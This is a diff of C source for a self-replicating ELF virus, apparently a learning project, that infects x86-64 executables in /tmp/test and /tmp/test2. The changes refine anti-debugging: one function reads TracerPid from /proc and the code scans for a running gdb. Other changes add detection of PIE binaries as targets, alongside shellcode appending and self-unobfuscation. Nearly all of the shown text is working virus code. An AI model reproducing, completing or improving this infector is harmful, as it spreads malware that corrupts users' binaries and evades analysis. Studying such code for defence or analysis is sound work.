@@ -3,20 +3,18 @@
 static void  start(void) {}
 asm("pushfq");
 int   entry_point(void *magic) {
-  int     ret;
   char    infectDir[] = "/tmp/test";
   char    infectDir2[] = "/tmp/test2";
   char    procName[] = "/proc/";
 
   if (checkProcess(procName) != 0)
     return (stop(1, magic));
-  /* if ((ret = preventDebug()) == -1) */
-  /*   return (stop(1, magic)); */
-  if (ret == 1)
-    return (stop(0, magic));
-  if (magic != (void *)0x42)
+  if (preventDebug(magic) != 0)
+    return (stop(1, magic));
+  if (magic != (void *)0x42) {
     if (unObfuscate() == -1)
       return (stop(1, magic));
+  }
   infectBins(infectDir);
   infectBins(infectDir2);
   return (stop(0, magic));
@@ -40,14 +38,6 @@ static int   stop(int status, void *magic) {
       "mov $0, %r11\n\t"
       "jmp endSC");
   return (status);
-}
-
-static void exit(int status) {
-  register int  rax asm("rax") = 60;
-  register int  rdi asm("rdi") = status;
-
-  asm("syscall"
-    : "=r" (rax));
 }
 
 static int  mprotect(void *addr, size_t len, int prot) {
@@ -94,7 +84,7 @@ static int unObfuscate(void) {
   return (0);
 }
 
-static int  read(int fd, char *buf, size_t count) {
+static ssize_t  read(int fd, char *buf, size_t count) {
   register ssize_t    rax asm("rax") = 0;
   register int        rdi asm("rdi") = fd;
   register const void *rsi asm("rsi") = buf;
@@ -158,6 +148,8 @@ static void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t
 
   asm("syscall"
     : "=r" (ret));
+  if ((long)ret < 0)
+    return (NULL);
   return (ret);
 }
 
@@ -180,15 +172,6 @@ static int  getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned in
   asm("syscall"
     : "=r" (rax));
   return (rax);
-}
-
-static pid_t  fork(void) {
-  register pid_t  ret asm("rax");
-  register int  rax asm("rax") = 57;
-
-  asm("syscall"
-    : "=r" (ret));
-  return (ret);
 }
 
 static long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data) {
@@ -221,6 +204,26 @@ static pid_t  waitpid(pid_t pid, int *stat_loc, int options) {
   register int    *rsi asm("rsi") = stat_loc;
   register int    rdx asm("rdx") = options;
   register struct rusage *r10 asm("r10") = NULL;
+
+  asm("syscall"
+    : "=r" (ret));
+  return (ret);
+}
+
+static pid_t  getpid(void) {
+  register pid_t  ret   asm("rax");
+  register int8_t  rax  asm("rax") = 39;
+
+  asm("syscall"
+    : "=r" (ret));
+  return (ret);
+}
+
+static int    raise(int sig, pid_t pid) {
+  register int    ret   asm("rax");
+  register int    rax asm("rax") = 200;
+  register pid_t  rdi asm("rdi") = pid;
+  register int    rsi asm("rsi") = sig;
 
   asm("syscall"
     : "=r" (ret));
@@ -341,7 +344,7 @@ static int  checkFileContent(char *dirname, char *filename) {
   char    procName[] = "gdb";
 
   len = strlen(dirname) + strlen(filename) + 1;
-  if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0)
+  if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL)
     return (-1);
   memcpy(tmp, dirname, strlen(dirname));
   strcat(tmp, slash);
@@ -373,7 +376,7 @@ static int  checkProcess(char *dirname) {
   char  procName[] = "/proc/";
   char  cmdlineName[] = "cmdline";
 
-  if ((buf = mmap(0, BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0)
+  if ((buf = mmap(0, BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL)
     return (-1);
   if ((fd = open(procName, O_RDONLY | O_DIRECTORY, 0)) < 0) {
     munmap(buf, BUF_SIZE);
@@ -387,8 +390,8 @@ static int  checkProcess(char *dirname) {
   while (bpos < nread) {
     dirp = (struct linux_dirent64 *)(buf + bpos);
     if (dirp->d_type == DT_DIR && dirp->d_name[0] > '0' && dirp->d_name[0] <= '9' && strcmp(dirname, procName) == 0) {
-      len = strlen(dirname) + strlen(procName) + 1;
-      if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0) {
+      len = strlen(dirp->d_name) + strlen(procName) + 1;
+      if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL) {
         munmap(buf, BUF_SIZE);
         return (-1);
       }
@@ -414,28 +417,69 @@ static int  checkProcess(char *dirname) {
   return (0);
 }
 
-static int   preventDebug(void) {
-  pid_t pid;
+static int   preventDebug(void *magic) {
+  pid_t   pid;
+  int     fd;
+  size_t  len;
+  char    *tmp;
+  ssize_t bread;
+  size_t  pidLen;
+  char    *pointer;
+  char    buf[BUF_SIZE];
+  char  procName[] = "/proc/";
+  char  statusName[] = "/status";
+  char  tracerPid[] = "TracerPid:";
 
-  if ((pid = fork()) != 0) {
-    if (pid < 0)
-      return (-1);
-    if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
-      kill(pid, 9);
-      return (-1);
+  pidLen = 0;
+  pid = getpid();
+  while (pid != 0) {
+    pid /= 10;
+    pidLen += 1;
+  }
+  if ((tmp = mmap(0, 14 + pidLen, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL)
+    return (-1);
+  memcpy(tmp, procName, 6);
+  pid = getpid();
+  len = pidLen;
+  while (pid != 0) {
+    tmp[5 + len] = pid % 10 + 48;
+    len -= 1;
+    pid /= 10;
+  }
+  strcat(tmp, statusName);
+  fd = open(tmp, O_RDONLY, 0);
+  munmap(tmp, 14 + pidLen);
+  if (fd < 0)
+    return (-1);
+  pointer = NULL;
+  while ((bread = read(fd, buf, BUF_SIZE)) > 0) {
+    if (pointer != NULL) {
+      pointer = buf;
+      while (pointer - buf <= bread && (*pointer < '0' || *pointer > '9'))
+        pointer += 1;
+      if (pointer - buf > bread)
+        continue ;
+      close(fd);
+      if (*pointer != '0')
+        return (1);
+      return (0);
     }
-    if (waitpid(pid, 0, 0) < 0) {
-      kill(pid, 9);
-      return (-1);
+    pointer = NULL;
+    if ((pointer = strstr(buf, tracerPid)) != NULL) {
+      pointer += strlen(tracerPid);
+      if (pointer - buf > bread)
+        continue ;
+      while (pointer - buf <= bread && (*pointer < '0' || *pointer > '9'))
+        pointer += 1;
+      if (pointer - buf > bread)
+        continue ;
+      close(fd);
+      if (*pointer != '0')
+        return (1);
+      return (0);
     }
-    ptrace(PTRACE_CONT, pid, 0, 0);
-    if (waitpid(pid, 0, 0) < 0) {
-      kill(pid, 9);
-      return (-1);
-    }
-    return (1);
-  } else
-    asm("int3");
+  }
+  close(fd);
   return (0);
 }
 
@@ -474,7 +518,7 @@ static int  mapFile(const char *dirname, const char *filename, struct bfile *bin
   struct stat stats;
 
   len = strlen(dirname) + strlen(filename) + 2;
-  if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0)
+  if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL)
     return (-1);
   memcpy(tmp, dirname, strlen(dirname));
   strcat(tmp, slash);
@@ -492,18 +536,18 @@ static int  mapFile(const char *dirname, const char *filename, struct bfile *bin
     return (1);
   }
   munmap(tmp, len);
-  if ((tmp = mmap(0, stats.st_size, PROT_READ, MAP_PRIVATE, fd, 0)) < 0) {
+  if ((tmp = mmap(0, stats.st_size, PROT_READ, MAP_PRIVATE, fd, 0)) == NULL) {
     close(fd);
     return (-1);
   }
   if (stats.st_size < sizeof(Elf64_Ehdr) ||
-    !isCompatible(((Elf64_Ehdr *)tmp)->e_ident, ((Elf64_Ehdr *)tmp)->e_machine)) {
+    !isCompatible((Elf64_Ehdr *)tmp)) {
     munmap(tmp, stats.st_size);
     close(fd);
     return (1);
   }
   len = strlen(payload) + sizeof(size_t) + 1;
-  if ((bin->header = mmap(0, stats.st_size + len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) < 0) {
+  if ((bin->header = mmap(0, stats.st_size + len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL) {
     close(fd);
     munmap(tmp, stats.st_size);
     return (-1);
@@ -667,7 +711,7 @@ static int  appendShellcode(struct bfile *bin) {
 
   size = end - start + (lambdaEnd - lambdaStart);
   new.size = bin->size + size + sizeof(ins);
-  if ((new.header = mmap(NULL, new.size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0))  < 0)
+  if ((new.header = mmap(NULL, new.size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == NULL)
     return (-1);
   memcpy(new.header, bin->header, bin->size);
   copyModifiedCode(&new, bin->size, size);
@@ -730,12 +774,36 @@ static int  infectFile(struct bfile bin) {
   munmap(bin.header, bin.size);
 }
 
-static int  isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine) {
-  return (e_ident[EI_MAG0] == ELFMAG0 &&
-          e_ident[EI_MAG1] == ELFMAG1 &&
-          e_ident[EI_MAG2] == ELFMAG2 &&
-          e_ident[EI_MAG3] == ELFMAG3 &&
-          e_machine == EM_X86_64);
+static int  isCompatible(Elf64_Ehdr *header) {
+  Elf64_Dyn   *dyn;
+  int         isExec;
+  Elf64_Shdr  *section;
+
+  if (!(header->e_ident[EI_MAG0] == ELFMAG0 &&
+      header->e_ident[EI_MAG1] == ELFMAG1 &&
+      header->e_ident[EI_MAG2] == ELFMAG2 &&
+      header->e_ident[EI_MAG3] == ELFMAG3 &&
+      header->e_machine == EM_X86_64))
+    return (0);
+  isExec = 0;
+  if (header->e_type == ET_EXEC)
+    isExec = 1;
+  else if (header->e_type == ET_DYN) {
+    section = ((void *)header) + header->e_shoff;
+    while (section->sh_type != SHT_DYNAMIC &&
+  section != ((void *)header) + header->e_shoff + sizeof(Elf64_Ehdr) * (header->e_shnum - 1))
+      section += 1;
+    if (section->sh_type == SHT_DYNAMIC) {
+      dyn = ((void *)header) + section->sh_offset;
+      while (dyn->d_tag != DT_FLAGS_1 && (void *)dyn < ((void *)header) + section->sh_offset + section->sh_size)
+        dyn += 1;
+      if (dyn->d_tag == DT_FLAGS_1) {
+        if ((int)(dyn->d_un.d_val & DF_1_PIE) == (int)DF_1_PIE)
+          isExec = 1;
+      }
+    }
+  }
+  return (isExec);
 }
 
 static int  isInfected(struct bfile bin) {
